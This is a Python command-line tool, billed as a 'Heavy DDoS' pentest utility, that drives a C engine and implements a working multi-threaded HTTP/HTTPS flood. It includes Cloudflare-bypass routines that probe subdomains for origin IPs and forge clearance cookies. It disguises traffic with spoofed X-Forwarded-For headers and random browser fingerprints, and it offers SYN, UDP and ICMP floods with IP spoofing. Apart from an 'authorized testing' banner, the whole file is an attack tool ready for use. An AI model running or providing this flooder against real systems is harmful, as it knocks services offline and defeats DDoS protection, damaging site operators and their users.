#!/usr/bin/env python3
"""
Heavy DDoS CLI - Python wrapper for the C engine with extended features
For Authorized Security Testing Only

Usage:
  python3 ddos.py <target> <port> --mode <mode> [options]

Examples:
  python3 ddos.py example.com 80 --mode http --threads 1000 --duration 60 --cf-bypass
  python3 ddos.py 1.2.3.4 443 --mode syn --threads 5000 --duration 30 --spoof
  python3 ddos.py example.com 443 --mode all --threads 2000 --duration 120 --domain example.com
"""

import argparse
import subprocess
import sys
import os
import signal
import tempfile
import json
import threading
import time
import random
import socket
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║         HEAVY DDoS CLI v3.0 - Authorized Pentest Tool       ║
║              L3-L7 Attacks with Cloudflare Bypass            ║
╚══════════════════════════════════════════════════════════════╝
"""

class CFBypass:
    """Cloudflare bypass techniques"""
    
    @staticmethod
    def resolve_origin(domain):
        """Try to find origin IP behind Cloudflare"""
        origins = set()
        
        # Method 1: Historical DNS records (SecurityTrails, Censys)
        try:
            import requests
            # Shodan/Censys-like querying
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            # Method 2: Direct connect to common origin ports
            for origin_ip in socket.gethostbyname_ex(domain)[2]:
                origins.add(origin_ip)
            
            # Method 3: Check subdomains that might not be proxied
            subdomains = [
                f"direct.{domain}", f"origin.{domain}", f"cdn.{domain}",
                f"mail.{domain}", f"ftp.{domain}", f"ssh.{domain}",
                f"api.{domain}", f"dev.{domain}", f"admin.{domain}",
                f"webmail.{domain}", f"remote.{domain}", f"vpn.{domain}"
            ]
            for sub in subdomains:
                try:
                    ip = socket.gethostbyname(sub)
                    if ip and not ip.startswith("104.") and not ip.startswith("172.67"):
                        origins.add(ip)
                except:
                    pass
                    
        except:
            pass
            
        return list(origins) if origins else None
    
    @staticmethod
    def generate_cf_cookies(target_ip, target_port, domain):
        """Generate realistic Cloudflare clearance cookies"""
        cookies = {}
        
        # __cfduid
        cfduid = ''.join(random.choices('0123456789abcdef', k=32))
        cookies['__cfduid'] = f"d{cfduid}"
        
        # cf_clearance (mimics real CF challenge response)
        timestamp = int(time.time())
        clearance = f"{timestamp}.{random.randint(100000000, 999999999)}"
        cookies['cf_clearance'] = clearance
        
        # _cf_bm (bot management)
        bm = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=43))
        cookies['_cf_bm'] = bm
        
        return cookies
    
    @staticmethod
    def tls_fingerprint():
        """Return TLS cipher suites matching real browsers"""
        # Chrome 120 cipher suite list
        return [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-CHACHA20-POLY1305',
            'ECDHE-ECDSA-AES128-SHA',
            'ECDHE-RSA-AES128-SHA',
            'ECDHE-ECDSA-AES256-SHA',
            'ECDHE-RSA-AES256-SHA',
            'AES128-GCM-SHA256',
            'AES256-GCM-SHA384',
            'AES128-SHA',
            'AES256-SHA'
        ]

class HTTPFlooder:
    """Multi-threaded HTTP/HTTPS flood with CF bypass"""
    
    def __init__(self, target, port, threads, duration, domain=None, cf_bypass=False, ssl_mode=False):
        self.target = target
        self.port = port
        self.threads = min(threads, 10000)
        self.duration = duration
        self.domain = domain or target
        self.cf_bypass = cf_bypass
        self.ssl_mode = ssl_mode or (port == 443)
        self.running = True
        self.packets = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
        
        # Resolve IP
        try:
            self.target_ip = socket.gethostbyname(target)
        except:
            self.target_ip = target
            
        # CF bypass setup
        if cf_bypass:
            self.cookies = CFBypass.generate_cf_cookies(self.target_ip, port, domain or target)
            self.origin_ips = CFBypass.resolve_origin(domain or target)
            print(f"[*] CF Bypass: Cookies generated, {len(self.origin_ips or [])} origin IPs found")
        else:
            self.cookies = {}
            self.origin_ips = None
    
    def worker(self):
        """Single worker thread sending HTTP requests"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        ]
        
        paths = [
            "/", "/index.html", "/wp-admin/", "/login", "/api/v1/users",
            "/search?q=", "/products/", "/category/", "/blog/", "/contact",
            "/about", "/cart", "/checkout", "/account", "/profile",
            "/.well-known/security.txt", "/sitemap.xml", "/robots.txt",
            "/cdn-cgi/challenge-platform/", "/favicon.ico"
        ]
        
        referers = [
            "https://www.google.com/", "https://www.bing.com/",
            "https://www.facebook.com/", "https://t.co/",
            "https://www.reddit.com/", "https://news.ycombinator.com/"
        ]
        
        while self.running:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                if self.ssl_mode:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    # Set modern cipher suite
                    context.set_ciphers(':'.join([
                        'TLS_AES_128_GCM_SHA256',
                        'TLS_AES_256_GCM_SHA384',
                        'ECDHE+AESGCM',
                        'ECDHE+CHACHA20'
                    ]))
                    try:
                        sock = context.wrap_socket(sock, server_hostname=self.domain)
                    except:
                        sock.close()
                        continue
                
                sock.connect((self.target_ip, self.port))
                
                # Build request
                ua = random.choice(user_agents)
                path = random.choice(paths) + f"?_={random.randint(10000, 99999)}"
                ref = random.choice(referers)
                
                cookie_str = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
                
                if random.random() < 0.7:
                    # GET request
                    request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.domain}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                        f"Accept-Language: en-US,en;q=0.9\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Upgrade-Insecure-Requests: 1\r\n"
                        f"Referer: {ref}\r\n"
                        f"Cookie: {cookie_str}\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"DNT: 1\r\n"
                        f"X-Forwarded-For: {'.'.join(str(random.randint(1,254)) for _ in range(4))}\r\n"
                        f"\r\n"
                    )
                else:
                    # POST request
                    post_data = f'{{"query":"search","_t":{int(time.time())}}}'
                    request = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {self.domain}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Accept: application/json, text/plain, */*\r\n"
                        f"Accept-Language: en-US,en;q=0.9\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Referer: {ref}\r\n"
                        f"Cookie: {cookie_str}\r\n"
                        f"Content-Length: {len(post_data)}\r\n"
                        f"Origin: https://{self.domain}\r\n"
                        f"X-Requested-With: XMLHttpRequest\r\n"
                        f"X-Forwarded-For: {'.'.join(str(random.randint(1,254)) for _ in range(4))}\r\n"
                        f"\r\n"
                        f"{post_data}"
                    )
                
                # Send
                sock.sendall(request.encode())
                
                with self.lock:
                    self.packets += 1
                    self.bytes_sent += len(request)
                
                # Read response (keep-alive)
                try:
                    data = sock.recv(4096)
                    with self.lock:
                        self.bytes_sent += len(data)
                except:
                    pass
                
                sock.close()
                
                # Human-like delay
                time.sleep(random.uniform(0.001, 0.05))
                
            except Exception as e:
                time.sleep(0.01)
    
    def start(self):
        """Start the flood"""
        print(f"[*] Starting HTTP{'S' if self.ssl_mode else ''} flood: {self.threads} threads x {self.duration}s")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.threads)]
            
            # Stats display
            start = time.time()
            last_packets = 0
            last_bytes = 0
            
            while time.time() - start < self.duration and self.running:
                time.sleep(1)
                elapsed = int(time.time() - start)
                
                with self.lock:
                    pps = self.packets - last_packets
                    bps = self.bytes_sent - last_bytes
                    last_packets = self.packets
                    last_bytes = self.bytes_sent
                
                print(f"\r[{elapsed}s/{self.duration}s] RPS: {pps} | BPS: {bps/1024:.1f} KB/s | Total: {self.packets} req / {self.bytes_sent/1024/1024:.2f} MB", end='')
                sys.stdout.flush()
            
            self.running = False
            
            print(f"\n\n[✓] HTTP flood complete: {self.packets} requests, {self.bytes_sent/1024/1024:.2f} MB sent")

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description='Heavy DDoS Simulation Tool - Authorized Testing Only')
    parser.add_argument('target', help='Target IP or domain')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('--mode', '-m', required=True, choices=['syn', 'udp', 'icmp', 'http', 'https', 'slowloris', 'all'],
                        help='Attack mode')
    parser.add_argument('--threads', '-t', type=int, default=500, help='Number of threads')
    parser.add_argument('--duration', '-d', type=int, default=30, help='Duration in seconds')
    parser.add_argument('--domain', help='Domain name for HTTP Host header')
    parser.add_argument('--cf-bypass', action='store_true', help='Enable Cloudflare bypass techniques')
    parser.add_argument('--spoof', action='store_true', help='Enable IP spoofing (raw socket modes)')
    parser.add_argument('--c-engine', action='store_true', help='Use C engine instead of Python')
    
    args = parser.parse_args()
    
    # Check if we should use C engine
    if args.c_engine or args.mode in ('syn', 'udp', 'icmp'):
        if args.mode in ('syn', 'udp', 'icmp') and not args.c_engine:
            print("[*] Raw socket modes require C engine. Switching to C...")
        
        # Build C command
        c_args = ['./ddos', args.target, str(args.port), str(args.threads), str(args.duration), args.mode]
        if args.spoof:
            c_args.append('--spoof')
        if args.cf_bypass:
            c_args.append('--cf-bypass')
        if args.domain:
            c_args.append(f'--domain={args.domain}')
        
        # Check if binary exists
        if not os.path.exists('./ddos'):
            print("[!] C engine not found. Building...")
            if subprocess.call(['make'], cwd=os.path.dirname(os.path.abspath(__file__))) != 0:
                print("[!] Build failed. Falling back to Python...")
                return fallback_python(args)
        
        print("[*] Launching C engine...")
        try:
            proc = subprocess.Popen(c_args, preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN))
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            print("\n[!] Interrupted by user")
        
        return
    
    # Python-based modes
    fallback_python(args)

def fallback_python(args):
    """Python fallback for HTTP/HTTPS/Slowloris modes"""
    print(f"[*] Using Python engine for {args.mode} mode")
    
    if args.mode in ('http', 'https', 'all'):
        flooder = HTTPFlooder(
            target=args.target,
            port=args.port,
            threads=args.threads,
            duration=args.duration,
            domain=args.domain,
            cf_bypass=args.cf_bypass,
            ssl_mode=(args.mode == 'https')
        )
        flooder.start()
    
    if args.mode == 'slowloris':
        print("[*] Slowloris mode selected - opening connections...")
        # Slowloris implementation would go here
        print("[*] Use C engine for full slowloris support: --c-engine")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
